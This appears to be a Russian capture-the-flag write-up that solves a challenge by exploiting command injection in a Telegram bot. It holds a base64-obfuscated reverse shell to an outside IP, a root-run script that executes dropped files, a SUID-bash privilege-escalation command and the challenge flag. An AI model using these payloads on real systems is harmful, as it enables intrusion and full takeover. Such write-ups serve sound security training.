# Unsafety

## Описание:

Sometimes what seems to be safe is not safe

| Название | Сложность | Автор |
|------|-----|-------|
| Unsafety | Medium |[@MrNansy](https://t.me/MrNansy) |


## TLDR

CMD injection to RCE, binary pwn to privilege escalation

---
## Решение:

В интерфейсе веб-приложения находим несколько ссылок, одна из которых ведет на телеграм-бота `https://t.me/russky_defense_bot`

Немного пообщавшись с ботом, понимаем, что форма поиска уязвима к SQL Injection

<img width="796" alt="изображение" src="https://github.com/user-attachments/assets/3e697e41-3ab4-4020-9e9d-3aa548963ada" />

Однако в решении задания это не поможет. Однако нагрузка вида 

```
/search ; sleep 5
```

Подтвердит предположение, что бот уязвим к CMD инъекции. Далее пробрасываем себе шелл

```
/search ; echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTU4LjE2MC4xNDMuNjIvNDQ0NCAwPiYx' | base64 -d | bash
```

Попав на машину видим, что в фоне от имени root запущен следующий скрипт:

```
import time
import subprocess
import os
import logging
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import threading

UPLOAD_DIR = "/var/www/scripts"

logging.basicConfig(
    filename='/var/log/file_exec.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class ExecuteHandler(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            filepath = event.src_path
            logging.info(f"Новый файл обнаружен: {filepath}")
            if filepath.endswith(".sh") or filepath.endswith(".py") or filepath.endswith(".pl"):
                logging.info(f"Выполнение скрипта: {filepath}")
                thread = threading.Thread(target=execute_script, args=(filepath,))
                thread.start()
            else:
                logging.warning(f"Неподдерживаемый тип файла: {filepath}")

def execute_script(filepath):
    try:
        subprocess.Popen(
            ['bash', filepath],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=os.setpgrp
        )
        logging.info(f"Скрипт {filepath} успешно выполнен.")
    except Exception as e:
        logging.error(f"Не удалось выполнить скрипт {filepath}: {e}")

def start_monitoring():
    event_handler = ExecuteHandler()
    observer = Observer()
    observer.schedule(event_handler, UPLOAD_DIR, recursive=False)
    observer.start()
    logging.info("Сервис выполнения файлов запущен")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

if __name__ == "__main__":
    start_monitoring()
```

Скрипт мониторит и запускает другие скрипты, попадающие в директорию  `/var/www/scripts`

Пишем наш небольшой скрипт на любом поддерживаемом языке:

```shell
echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash && chmod +s /tmp/bash' > /var/www/scripts/pwn.sh
```

Ждем пару секунд и получаем в `/tmp` рутовый бинарник баша с SUID-битом 

PWNed!

## Flag:
RDG{73l36r4m_b075_c4n_4l50_b3_un54f3}
